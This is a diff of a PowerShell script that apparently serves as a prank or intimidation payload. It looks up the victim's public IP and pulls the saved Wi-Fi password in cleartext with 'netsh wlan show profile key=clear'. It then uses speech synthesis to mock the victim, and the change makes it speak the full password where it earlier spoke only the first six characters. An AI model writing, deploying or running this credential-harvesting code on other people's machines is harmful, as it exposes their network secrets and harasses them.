@@ -115,7 +115,7 @@ function Get-PubIP {
         -ErrorAction SilentlyContinue
     }
 
-    return "your public I P address is $firstTwoOctets, I won't say the rest of the I P, just for security, I care for you. Don't you believe me ... take your time checking"
+    return "your public I P address is $firstTwoOctets, I won't say the rest of the I P, just for your safety .. I care for you ....... Don't you believe me ... take your time checking"
 }
 
 # echo statement used to track progress while debugging
@@ -130,6 +130,7 @@ echo "Pub IP Done"
 #>
 
 
+
 function Get-Pass {
 
     #-----VARIABLES-----#
@@ -138,40 +139,40 @@ function Get-Pass {
 
     try {
 
-        $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
-        $pos = $pro.IndexOf(':')
-        $pro = $pro.Substring($pos+2).Trim()
+    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
+    $pos = $pro.IndexOf(':')
+    $pro = $pro.Substring($pos+2).Trim()
 
-        $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
-        $passPOS = $pass.IndexOf(':')
-        $pass = $pass.Substring($passPOS+2).Trim()
-        
-        if($pro -like '*_5GHz*') {
-            $pro = $pro.Trimend('_5GHz')
-        } 
+    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
+    $passPOS = $pass.IndexOf(':')
+    $pass = $pass.Substring($passPOS+2).Trim()
+    
+    if($pro -like '*_5GHz*') {
+      $pro = $pro.Trimend('_5GHz')
+    } 
 
-        $pwl = $pass.length
-        $firstSixChars = $pass.Substring(0, [Math]::Min(6, $pass.Length)) # Get the first 6 characters of the password
+    $pwl = $pass.length
+
 
     }
  
-    # If no network is detected function will return $null to avoid sapi speak
+ # If no network is detected function will return $null to avoid sapi speak
+ 
     # Write Error is just for troubleshooting
-    catch {
-        Write-Error "No network was detected" 
-        return $null
-        -ErrorAction SilentlyContinue
+    catch {Write-Error "No network was detected" 
+    return $null
+    -ErrorAction SilentlyContinue
     }
 
 
+# ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $badPASS = "$pro is not a very creative name, but at least it's not as bad as your Wi-Fi password. Only $pwl characters long? $firstSixChars... For your sake of security, I won't say the rest... but seriously, that's the best you could come up with? Be more creative next time."
+    $badPASS = "$pro is not a very creative name but at least it is not as bad as your wifi password... only $pwl characters long? $pass ...? really..? $pass was the best you could come up with?"
     
-    $okPASS = "$pro is not a very creative name, but at least you're trying a little bit. Your password is $pwl characters long. Still trash though... $firstSixChars... For your sake of security, I won't say the rest... You can do better."
+    $okPASS = "$pro is not a very creative name but at least you are trying a little bit, your password is $pwl characters long, still trash though.. $pass ...? You can do better"
     
-    $goodPASS = "$pro is not a very creative name, but at least you're not a total fool. A $pwl-character long password actually isn't bad. But it didn't save you from me, did it? No... it... did... not! $firstSixChars... For your sake of security, I won't say the rest... It's a decent password, though. Just try to be a bit more creative."
+    $goodPASS = "$pro is not a very creative name but At least you are not a total fool... $pwl character long password actually is not bad, but it did not save you from me did it? no..it..did..not! $pass is a decent password though."
 #----------------------------------------------------------------------------------------------------
-
 
     if($pass.length -lt 8) { return $badPASS
 
@@ -631,6 +632,8 @@ $s.Speak($intro)
 $s.Speak($RAMwarn)
 
 $s.Speak($PUB_IPwarn)
+
+Start-Sleep -Seconds 10
 
 $s.Speak($PASSwarn)
 
